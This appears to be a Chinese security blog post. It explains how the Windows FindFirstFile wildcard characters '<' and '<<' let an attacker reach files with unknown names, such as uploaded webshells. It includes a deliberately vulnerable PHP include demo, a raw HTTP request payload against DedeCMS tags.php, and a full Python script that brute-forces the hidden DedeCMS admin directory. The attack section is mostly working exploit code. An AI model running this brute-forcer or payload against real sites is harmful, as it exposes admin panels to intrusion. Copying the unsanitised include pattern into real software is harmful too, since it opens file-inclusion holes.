>
> **[本文作者：红日安全团队——Mochazz](https://bbs.ichunqiu.com/thread-34852-1-1.html?from=beef)**[](https://bbs.ichunqiu.com/space-> uid-218309.html)  
>

早上看了先知论坛的这篇文章：[解决DEDECMS历史难题--找后台目录](https://bbs.ichunqiu.com/thread-34852-1-1.html?from=beef)
不得不说作者思路确实巧妙，作者巧妙的利用了Windows
FindFirstFile和织梦程序代码中对上传图片的逻辑判断，成功在Windows环境下爆破出后台目录。可能一些人不了解Windows
FindFirstFile，其实就是Windows在搜索文件时，使用到的一个winapi
函数，有时候我们找不到自己上传的马时，也可以利用它，请阅读下面一段解释：

> 目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID
> 读取出文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell 文件路径，但是当在Windows
> 下时，我们只需要知道文件所在目录，然后利用Windows 的特性就可以访问到文件，这是因为Windows
> 在搜索文件的时候使用到了FindFirstFile 这一个winapi 函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。
>
>
> 利用方法很简单，我们只要将文件名不可知部分之后的字符用“<”或者“>”代替即可，不过要注意的一点是，只使用一个“<”或者“>”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1<”或者“1>”都是访问不到文件的，需要“1<<”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。

PS：这两段话出自《[代码审计](https://bbs.ichunqiu.com/thread-34852-1-1.html?from=beef)\--企业级Web代码安全架构》一书。感觉后面一段话有些问题，在实际测试中用“<”或者“<<”都可以读到文件名很长的文件，而作者说“<”只能代表一个字符。

我们可以尝试一下，新建两个文件，5149ff33ebec0e6ad37613ea30694c07.php、demo.php，内容如下：

    
    
    # 5149ff33ebec0e6ad37613ea30694c07.php
    <?php
            phpinfo();
    ?>
    
    
    # demo.php
    <?php
            $filename = $_GET["file"];
            include $filename.".php";
    ?>

访问
[http://localhost/demo.php?file=5&amplt](https://bbs.ichunqiu.com/thread-34852-1-1.html?from=beef);
，成功包含5149ff33ebec0e6ad37613ea30694c07.php文件。

![1.png](https://image.3001.net/images/20180301/15198752369479.png!small)  

下面我们再来看看如何使用这种方式，快速爆破处dedecms后台。代码逻辑，先知的
[这篇文章](https://bbs.ichunqiu.com/thread-34852-1-1.html?from=beef)
已经讲的很细了，这里直接看具体payload：

    
    
    POST /tags.php HTTP/1.1
    Host: 192.168.1.9
    Cache-Control: max-age=0
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 132
    
    _FILES[mochazz][tmp_name]=./mo<</images/adminico.gif&_FILES[mochazz][name]=0&_FILES[mochazz][size]=0&_FILES[mochazz][type]=image/gif

![2.png](https://image.3001.net/images/20180301/15198752472167.png!small)![3.png](https://image.3001.net/images/20180301/15198752475741.png!small)  

可以看到目录文件存在和不存在，返回结果是不一样的，所以我们可以用python写个简单的爆破程序：

    
    
    #!/usr/bin/env python
    '''/*
        * author = Mochazz
        * team   = 红日安全团队
        * env    = pyton3
        *
        */
    '''
    import requests
    import itertools
    characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
    back_dir = ""
    flag = 0
    url = "http://192.168.1.9/tags.php"
    data = {
        "_FILES[mochazz][tmp_name]" : "./{p}<</images/adminico.gif",
        "_FILES[mochazz][name]" : 0,
        "_FILES[mochazz][size]" : 0,
        "_FILES[mochazz][type]" : "image/gif"
    }
    
    for num in range(1,7):
        if flag:
            break
        for pre in itertools.permutations(characters,num):
            pre = ''.join(list(pre))
            data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
            print("testing",pre)
            r = requests.post(url,data=data)
            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                flag = 1
                back_dir = pre
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                break
            else:
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
    print("[+] 前缀为：",back_dir)
    flag = 0
    for i in range(30):
        if flag:
            break
        for ch in characters:
            if ch == characters[-1]:
                flag = 1
                break
            data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir+ch)
            r = requests.post(url, data=data)
            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                back_dir += ch
                print("[+] ",back_dir)
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                break
            else:
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
    
    print("后台地址为：",back_dir)

演示结果：

![5.gif](https://image.3001.net/images/20180301/15198752629470.gif!small)  

  

  

 **> >>>>> [黑客入门必备技能](https://www.ichunqiu.com/zhihu?from=beef)
**带你入坑和逗比表哥们一起聊聊黑客的事儿，他们说高精尖的技术比农药都好玩~  

  

  

